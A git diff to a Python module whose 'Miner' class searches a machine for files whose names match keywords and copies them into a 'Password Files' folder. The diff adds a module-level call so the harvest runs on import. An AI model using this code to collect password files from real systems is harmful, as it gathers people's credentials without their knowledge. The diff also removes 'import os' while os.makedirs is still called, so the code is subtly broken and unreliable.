@@ -1,8 +1,7 @@
-import os
 from pathlib import Path
 import shutil
-from Libs.__lib_actions import *
-
+from __lib_actions import *
+from __lib_log import * 
 
 class Miner:
     @staticmethod
@@ -39,13 +38,13 @@ class Miner:
                             dst_file_path = destination / filename
 
                             shutil.copy(src_file_path, dst_file_path)
-                            Log(debug=DEBUG).info(
+                            log.info(
                                 f"Copied {src_file_path} to {dst_file_path}"
                             )
                     except Exception as e:
-                        Log(debug=DEBUG).error(f"Failed to copy file: {e}")
+                        log.error(f"Failed to copy file: {e}")
             except Exception as e:
-                Log(debug=DEBUG).error(f"Failed to copy file: {e}")
+                log.error(f"Failed to copy file: {e}")
 
     def passwords(self):
         # Keywords to search for in filenames
@@ -55,4 +54,7 @@ class Miner:
         os.makedirs("Password Files")
         for word in keywords:
             self.__search_and_copy_files(word)
-        Log(debug=DEBUG).info("Sensitive Data Miner Completed")
+        log.info("Sensitive Data Miner Completed")
+
+log = Log(debug=DEBUG)
+Miner().passwords()
